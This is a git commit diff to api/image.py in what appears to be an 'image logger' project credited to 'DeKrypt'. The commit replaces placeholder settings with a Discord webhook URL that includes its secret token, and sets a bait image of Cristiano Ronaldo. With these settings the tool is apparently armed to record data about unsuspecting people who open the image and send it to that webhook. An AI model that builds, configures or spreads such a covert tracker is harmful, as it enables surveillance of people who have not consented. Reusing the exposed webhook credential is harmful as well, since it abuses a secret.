ec8f8c255e06475a909a1f5c84beb2b1dd3ef5f7
rares216 <rareseica5@gmail.com>
2025-02-08 16:06:29 +0200

    image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1337785578455830609/qb-51IPS4DWAVlCHgNnOdIwzrD5G9eY-Fl8JivhfCml-Vww8OyxjMS_pSSz-fnjempn3",
+    "image": "https://assets.goal.com/images/v3/blt2aaca933046f8b00/Cristiano%20Ronaldo%20Portugal%202024%20(4).jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
